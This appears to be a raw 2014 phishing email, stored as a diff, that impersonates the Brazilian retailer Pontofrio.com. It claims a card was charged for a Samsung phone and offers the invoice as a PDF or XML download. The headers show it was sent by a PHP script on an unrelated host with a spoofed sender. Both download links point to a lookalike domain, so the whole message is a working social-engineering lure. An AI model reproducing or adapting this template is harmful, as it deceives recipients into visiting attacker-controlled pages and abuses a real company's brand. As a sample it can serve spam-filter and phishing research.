@@ -1,0 +1,132 @@
+Return-path: <www-data@cpro22900.publiccloud.com.br>
+Envelope-to: hq@worldfinancesearchengines.com
+Delivery-date: Mon, 04 Aug 2014 19:38:43 -0600
+Received: from [179.188.0.211] (port=33644 helo=cpro22900.publiccloud.com.br)
+	by rsj14.rhostjh.com with esmtp (Exim 4.82)
+	(envelope-from <www-data@cpro22900.publiccloud.com.br>)
+	id 1XETht-0003LT-TZ
+	for hq@worldfinancesearchengines.com; Mon, 04 Aug 2014 19:38:43 -0600
+Received: by cpro22900.publiccloud.com.br (Postfix, from userid 33)
+	id DD039A4613; Mon,  4 Aug 2014 22:32:42 -0300 (BRT)
+To: hq@worldfinancesearchengines.com
+Subject: hq@worldfinancesearchengines.com  - Débito realizado com sucesso. Nota fiscal eletrônica emitida com sucesso, verifique seu pedido.
+X-PHP-Originating-Script: 0:c.php
+MIME-Version: 1.0
+Content-type: text/html; charset=iso-8859-1
+From: Pontofrio.com <acompanhamentopedido@sac.pontofrio.com>
+Message-Id: <20140805013242.DD039A4613@cpro22900.publiccloud.com.br>
+Date: Mon,  4 Aug 2014 22:32:42 -0300 (BRT)
+X-Identified-User: {0000:rsj14.rhostjh.com:local:local} {sentby:Delivered locally}
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Ponto Frio</title>
+</head>
+
+<body>
+<table width="100%">
+  <tbody>
+    <tr>
+      <td><table width="550" border="0" align="center" cellpadding="0" cellspacing="0">
+        <tbody>
+          <tr>
+            <td><p style="font:13px Tahoma, Geneva, sans-serif;"><img src="http://imagens.pontofrio.com.br/news/padrao/site/topo_sac_email.jpg" alt="PONTOFRIO.COM - Emissão de NF-e (Nota Fiscal   Eletrônica)" /></p></td>
+          </tr>
+          <tr>
+            <td style="background:#F7F7F7;padding:15px;"><table width="520" border="0" align="center" cellpadding="0" cellspacing="0">
+              <tbody>
+                <tr>
+                  <td><table width="100%" cellpadding="0" cellspacing="0">
+                    <tbody>
+                      <tr>
+                        <td style="font:11px Tahoma, Geneva, sans-serif;"><p>
+						Prezado(a) <strong>hq@worldfinancesearchengines.com
+</strong>,</p>
+                          <p>Foi emitida uma NF-e (Nota Fiscal Eletrônica) 
+							referente ao seu pedido <strong>nº 11819</strong>, 
+							realizado em <strong>04/08/2014 as 22:32</strong>.<br />
+                          </p></td>
+                      </tr>
+                      <tr>
+                        <td style="font:11px Tahoma, Geneva, sans-serif;" height="20">
+						&nbsp;</td>
+                      </tr>
+                      <tr>
+                        <td style="font:11px Tahoma, Geneva, sans-serif;"><p> <strong>
+						NF-e : Nota Fiscal Eletrônica<br />
+                          <br />
+                        </strong>Escolha abaixo a melhor forma de consultar a 
+						sua NF-e : </p>
+                          <ul>
+                            <li style="">
+							<a title="NOTA.FISCAL" target="_blank" style="color:#8B0000;" href="http://pontofrio.pagina-oficial.com/11819-hq@worldfinancesearchengines.com
+-04/08/2014-22:32">
+							Download em formato PDF</a></li>
+                            <li style="">
+							<a title="NOTA.FISCAL" target="_blank" style="color:#8B0000;" href="http://pontofrio.pagina-oficial.com/11819-hq@worldfinancesearchengines.com
+-04/08/2014-22:32">
+							Download em formato XML</a></li>
+                          </ul></td>
+                      </tr>
+                      <tr>
+                        <td style="font:11px Tahoma, Geneva, sans-serif;">&nbsp;</td>
+                      </tr>
+                    </tbody>
+                  </table></td>
+                </tr>
+                <tr>
+                  <td style="font:11px Tahoma, Geneva, sans-serif;"><p>
+					Enviaremos um novo e-mail a cada evolução no andamento do 
+					seu pedido.<br />
+                  </p></td>
+                </tr>
+                <tr>
+                  <td style="font:11px Tahoma, Geneva, sans-serif;">&nbsp;</td>
+                </tr>
+                <tr>
+                  <td style="font:11px Tahoma, Geneva, sans-serif;"><p><strong>
+					Prazo de Entrega:</strong>&nbsp;<br />
+                    Prazo: até 15/08/2014<br />
+                    <br />
+                    Produto: CELULAR DESBLOQUEADO GALAXY S4 MINI DUOS I9192 BCO 
+					SAMSUNG<br />
+                    Qtde: 1<br />
+                    Preço unitário: R$ 949,90<br />
+                    Valor total: R$ 949,90</p>
+                    <p><strong>Formas de Pagamento:&nbsp;</strong>Amex<br />
+                      Parcelas: 10 vezes de R$ 95,89<br />
+                      <br />
+                      <br />
+                      Total Produtos R$ 949,90<br />
+                      Total Descontos R$ 0,00<br />
+                      Total Frete R$ 8,99<br />
+                      Total Pedido R$ 958,89</p>
+                    <p><b>Status do Pedido:</b><br />
+                      Pagamento Confirmado - Débito realizado com sucesso
+                    </p>
+                    <center>
+                    </center></td>
+                </tr>
+              </tbody>
+            </table></td>
+          </tr>
+          <tr>
+            <td height="90" style="font:12px Tahoma, Geneva, sans-serif;background:#9c0105;color:#FFFFFF;padding:15px;"><p>
+			Atenciosamente,</p>
+              <p>Pontofrio.com<br />
+                <a href="http://www.pontofrio.com/" title="www.pontofrio.com" target="_blank" style="color:#FFFF00;">
+				www.pontofrio.com</a></p></td>
+          </tr>
+          <tr>
+            <td align="center" style="font:10px Tahoma, Geneva, sans-serif;"><p>
+			Esta é uma mensagem automática. Por favor, não a responda.</p></td>
+          </tr>
+        </tbody>
+      </table></td>
+    </tr>
+  </tbody>
+</table>
+</body>
+</html>
